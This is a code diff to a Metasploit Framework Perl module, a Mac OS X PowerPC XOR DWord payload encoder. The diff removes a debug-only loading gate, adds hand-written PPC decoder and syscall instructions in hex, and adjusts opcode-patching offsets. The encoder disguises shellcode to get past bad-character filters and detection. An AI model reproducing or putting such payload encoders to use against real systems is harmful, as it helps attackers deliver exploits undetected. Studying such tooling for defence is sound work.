@@ -11,7 +11,6 @@ package Msf::Encoder::QuackQuack;
 use strict;
 use base 'Msf::Encoder';
 use Pex::Encoder;
-use Pex::Encoding::XorDword;
 
 my $advanced = 
 {
@@ -21,7 +20,7 @@ my $advanced =
 my $info = {
     'Name'    => 'MacOS X PPC DWord Xor Encoder',
     'Version' => '1.0',
-    'Authors' => [ 'optyx <optyx [at] uberhax0r.net>',
+    'Authors' => [ 'optyx <optyx@uberhax0r.net>',
                    'H D Moore <hdm [at] metasploit.com>' ],
     'Arch'    => [ 'ppc' ],
     'OS'      => [ 'osx' ],
@@ -34,19 +33,13 @@ sub new {
     return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
 }
 
-sub Loadable {
-    my $self = shift;
-    return(0) if ! $self->GetLocal('DebugPPC');
-    return 1;
-}
-
 sub EncodePayload {
     my $self     = shift;
     my $payload  = shift;
     my $badchars = shift;
 
-    my $xor_key   = Pex::Encoding::XorDword->KeyScan($payload, $badchars);
-    my $xor_data  = Pex::Encoding::XorDword->Encode($xor_key, $payload);
+    my $xor_key   = Pex::Encoder::XorKeyScanDword($payload, $badchars);
+    my $xor_data  = Pex::Encoder::XorDword($xor_key, $payload);
 
     my $encoder = pack("N*", 
         0x7c631a79,  # xor.      r3,r3,r3
@@ -67,6 +60,12 @@ sub EncodePayload {
         0x398cfef0,  # addi      r12,r12,-272   # 62
         0x7d8c6379,  # mr.       r12,r12
         0x4082ffd8,  # bne+      decode_loop
+	0x3be030ff,  # li        r31, 0x30ff
+     	0x7fe04e70,  # srawi     r0, r31, 9
+	0x44ffff02,  # sc
+        0x7c631a79,  # xor.      r3,r3,r3
+        0x7c631a79,  # xor.      r3,r3,r3
+        0x7c631a79,  # xor.      r3,r3,r3
     );
 
     my $icount = (length($payload) / 4);
@@ -77,11 +76,11 @@ sub EncodePayload {
         $enc = $encoder;
         
         # happy fun time opcode patching
-        substr($enc, 14, 2, pack('n', -$size -4 + (16 * 4)));
+        substr($enc, 14, 2, pack('n', -$size -4 + (22 * 4)));
         substr($enc, 18, 2, pack('n', $scale * $icount));
-        substr($enc, 26, 2, pack('n', -$size + (16 * 4)));
-        substr($enc, 30, 2, pack('n', -$size -4 + (16 * 4)));
-        substr($enc, 38, 2, pack('n', -$size -4 + (16 * 4)));        
+        substr($enc, 26, 2, pack('n', -$size + (22 * 4)));
+        substr($enc, 30, 2, pack('n', -$size -4 + (22 * 4)));
+        substr($enc, 38, 2, pack('n', -$size -4 + (22 * 4)));        
         substr($enc, 62, 2, pack('n', -$scale));
         if (Pex::Text::BadCharIndex($badchars, $enc) == -1) {
             $enc .= $xor_data . pack('V', $xor_key);
